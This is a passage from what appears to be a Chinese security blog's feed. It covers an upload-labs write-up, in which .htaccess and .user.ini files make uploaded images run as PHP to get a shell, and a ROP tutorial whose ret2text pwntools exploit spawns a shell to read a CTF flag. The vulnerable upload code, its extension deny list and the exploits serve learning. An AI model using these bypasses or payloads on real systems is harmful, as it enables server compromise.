class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们乍一看跟上面第四关的源码好像是一摸一样的，但是其pass的思路不大相同，再看看提示<br><strong>提示：上传目录存在php文件（readme.php）</strong><br>笔者的第一想法可能是设计”文件包含(include)”，有了大致思路我们可以再想想应该如何去include这个存在我们的一句话或者是phpinfo的文件并将其正常解析，以传统的经验来看我们可以尝试着上传<code>.htaccess</code>文件，以下笔者在此阐述什么是<code>.htaccess</code>文件以及为什么要这样去做</p><p>首先看看ChatGPT给出的解释</p><p><img src="/images/upload-labs-1.PNG" alt="What is &quot;.htaccess&quot;"></p><p>于是我们得知：<code>.htaccess</code>是运行 Apache（以及兼容服务器，如 LiteSpeed）的 Web 服务器使用的配置文件，用于控制服务器行为的各个方面</p><p>既然它可以控制服务器，而上传点又未进行过滤，于是我们可以构造出内容为以下的<code>.htaccess</code>文件</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;test.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>这个文件的内容的意思是告诉<code>Apache</code>当检测到<code>test.jpg</code>文件时，将该文件按照<code>php</code>去解析，于是可以通过此方法getshell</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>源码分析</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以在里面发现其在第五关的基础上还过滤了<code>htaccess</code>文件，但是还是有方法解析，在此笔者介绍一个方法，使用<code>.user.ini</code></p><p><img src="/images/upload-labs-2.PNG" alt="What is &quot;.user.ini&quot;"></p><p><code>.user.ini</code>文件是一个 PHP 配置文件，主要用于共享主机环境（例如基于 cPanel 的服务器），它允许按目录覆盖 PHP 配置，类似于 <code>.htaccess</code> 对 <code>Apache</code> 的工作方式</p><p>因此我们的知<code>.user.ini</code>的功能大致和<code>.htaccess</code>的作用是一样的，都能够实现对服务器主机的一些操作，于是我们构造以下内容的<code>.user.ini</code>文件</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">666</span>.jpg</span><br></pre></td></tr></table></figure><p>这个文件的内容的意思是，所有的PHP都自动包含<code>666.jpg</code>文件，于是这样就构成了文件包含(file_include)漏洞，最终实现解析。</p><p>这次小计的内容到此结束，通过以上和后面的剩余关卡，大致总结出的思路有：前端、多后缀&#x2F;后缀混淆、大小写、上传配置文件和各类图片马制作以构造文件包含漏洞实现解析，进一步getshell</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Basic ROP Learning</title>
      <link href="/2025/04/19/Basic-ROP-Learning/"/>
      <url>/2025/04/19/Basic-ROP-Learning/</url>
      
        <content type="html"><![CDATA[<h2 id="Basic-ROP-Learning"><a href="#Basic-ROP-Learning" class="headerlink" title="Basic-ROP-Learning"></a>Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述"><a href="#ROP-Return-Oriented-Programming-概述" class="headerlink" title="ROP(Return-Oriented Programming)概述"></a>ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. <strong>基本概念</strong></h3><h4 id="（1）产生背景"><a href="#（1）产生背景" class="headerlink" title="（1）产生背景"></a>（1）产生背景</h4><ul><li><p><strong>DEP&#x2F;NX防护</strong>：现代系统禁止执行栈&#x2F;堆上的代码（数据执行保护）。</p></li><li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p></li><li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p></li></ul><span id="more"></span><h4 id="（2）核心原理"><a href="#（2）核心原理" class="headerlink" title="（2）核心原理"></a>（2）核心原理</h4><ul><li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p></li><li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成”代码链”。</p></li></ul><hr><h3 id="2-关键组件"><a href="#2-关键组件" class="headerlink" title="2. 关键组件"></a>2. <strong>关键组件</strong></h3><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td><strong>Gadget</strong></td><td>程序中原有的短指令序列（通常以<code>ret</code>结尾），实现基本操作（如读写寄存器）。</td></tr><tr><td><strong>ROP Chain</strong></td><td>由多个gadget地址和参数组成的栈数据，控制程序执行流。</td></tr><tr><td><strong>Stack Pivot</strong></td><td>将栈指针（ESP&#x2F;RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td></tr></tbody></table><hr><h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3. 攻击步骤"></a>3. <strong>攻击步骤</strong></h3><ol><li><p><strong>信息泄露</strong></p><ul><li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li></ul></li><li><p><strong>寻找Gadgets</strong></p><ul><li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li></ul></li><li><p><strong>构造ROP Chain</strong></p><ul><li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li></ul></li><li><p><strong>触发漏洞</strong></p><ul><li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li></ul></li></ol><hr><h3 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. <strong>防御措施</strong></h3><table><thead><tr><th>防御技术</th><th>原理</th></tr></thead><tbody><tr><td><strong>ASLR</strong></td><td>随机化内存布局，增加gadget地址预测难度。</td></tr><tr><td><strong>Stack Canary</strong></td><td>在栈帧中插入校验值，防止返回地址被覆盖。</td></tr><tr><td><strong>CFI</strong></td><td>控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。</td></tr><tr><td><strong>PIC&#x2F;PIE</strong></td><td>位置无关代码，增强ASLR效果。</td></tr></tbody></table><h3 id="5-实例-Linux-x86-ROP-Exploit"><a href="#5-实例-Linux-x86-ROP-Exploit" class="headerlink" title="5.实例 Linux x86 ROP Exploit"></a>5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="(1) ret2text"></a>(1) ret2text</h5><ul><li><h4 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a><strong>基本分析</strong></h4></li></ul><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p><p>先看看程序的保护机制</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ checksec ret2text</span><br><span class="line">[*] <span class="string">&#x27;/ret2text&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0</span>80485FD secure          proc near</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD input           = dword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0</span>80485FD secretcode      = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0</span>80485FD                 push    ebp</span><br><span class="line">.text:<span class="number">0</span>80485FE                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0</span>8048600                 sub     esp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0</span>8048603                 mov     dword ptr [esp], <span class="number">0</span> ; timer</span><br><span class="line">.text:<span class="number">0</span>804860A                 call    _time</span><br><span class="line">.text:<span class="number">0</span>804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:<span class="number">0</span>8048612                 call    _srand</span><br><span class="line">.text:<span class="number">0</span>8048617                 call    _rand</span><br><span class="line">.text:<span class="number">0</span>804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:<span class="number">0</span>804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048622                 mov     [esp<span class="number">+4</span>], eax</span><br><span class="line">.text:<span class="number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:<span class="number">0</span>804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">0</span>8048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:<span class="number">0</span>8048638                 jnz     <span class="type">short</span> locret_8048646</span><br><span class="line">.text:<span class="number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0</span>8048641                 call    _system </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0</span>80486A7                 lea     eax, [esp<span class="number">+80</span>h+s]</span><br><span class="line">.text:<span class="number">0</span>80486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">0</span>80486AE                 call    _gets</span><br><span class="line">.text:<span class="number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="string">&quot;Maybe I will tell you next time !&quot;</span></span><br><span class="line">.text:<span class="number">0</span>80486BA                 call    _printf</span><br><span class="line">.text:<span class="number">0</span>80486BF                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0</span>80486C4                 leave</span><br></pre></td></tr></table></figure><p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">~ <span class="function">gdb ret2text</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">12.1</span><span class="number">-0u</span>buntu1~<span class="number">22.04</span><span class="number">.2</span>)</span> 12.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2022 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">gef➤ b *0x080486AE </span></span><br><span class="line"><span class="function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="number">24.</span> </span></span><br><span class="line"><span class="function">gef➤ r </span></span><br><span class="line"><span class="function">There is something amazing here, do you know anything? Breakpoint <span class="number">1</span>, <span class="number">0x080486ae</span> in main () at ret2text.c:<span class="number">24</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[ Legend: Modified register | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$eax   : <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebx   : <span class="number">0xf7fac000</span>  →  <span class="number">0x00229dac</span></span></span><br><span class="line"><span class="function">$ecx   : <span class="number">0xf7fad9b4</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$edx   : <span class="number">0x1</span></span></span><br><span class="line"><span class="function">$esp   : <span class="number">0xffffcf50</span>  →  <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebp   : <span class="number">0xffffcfd8</span>  →  <span class="number">0xf7ffd020</span>  →  <span class="number">0xf7ffda40</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$esi   : <span class="number">0xffffd094</span>  →  <span class="number">0xffffd1fc</span>  →  <span class="string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span></span><br><span class="line"><span class="function">$edi   : <span class="number">0xf7ffcb80</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$eip   : <span class="number">0x080486ae</span>  →  &lt;main<span class="number">+0066</span>&gt; call <span class="number">0x8048460</span> &lt;gets@plt&gt;</span></span><br><span class="line"><span class="function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="function">$cs: <span class="number">0x23</span> $ss: <span class="number">0x2b</span> $ds: <span class="number">0x2b</span> $es: <span class="number">0x2b</span> $fs: <span class="number">0x00</span> $gs: <span class="number">0x63</span></span></span><br></pre></td></tr></table></figure><ul><li><h4 id="栈内存布局分析"><a href="#栈内存布局分析" class="headerlink" title="栈内存布局分析"></a><strong>栈内存布局分析</strong></h4></li></ul><p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c &#x3D; 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p><ul><li><h4 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a><strong>验证猜想</strong></h4>通过我们上面的分析可以构造以下payload:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">108</span> + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>得到以下输出，想想是哪里出了问题呢？</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1593</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> ![*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[*] Process <span class="string">&#x27;./ret2text&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 1593)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure><p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">总偏移 = buf 到 <span class="built_in">EBP</span> 的距离 (<span class="number">0x6c</span>) + <span class="built_in">EBP</span> 自身大小 (<span class="number">4</span>) = <span class="number">0x70</span> (<span class="number">112</span>)</span><br></pre></td></tr></table></figure><p>因此，正确的payload是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line"><span class="comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> *(<span class="number">108</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1766</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> !$ <span class="built_in">ls</span></span><br><span class="line">exp.py  flag  ret2text</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;This_is_the_right_payload&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./ret2text&#x27;</span> (pid 1766)</span><br></pre></td></tr></table></figure><p>不断更新，敬请期待！</p><script src="https://giscus.app/client.js"        data-repo="solkatt-cn/solkatt-cn.github.io"        data-repo-id="R_kgDONzaTTQ"        data-category="Announcements"        data-category-id="DIC_kwDONzaTTc4Cpqn7"        data-mapping="pathname"        data-strict="0"        data-reactions-enabled="1"        data-emit-metadata="0"        data-input-position="top"        data-theme="preferred_color_scheme"        data-lang="zh-CN"        crossorigin="anonymous"        async></script>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件竞争漏洞学习</title>
      <link href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
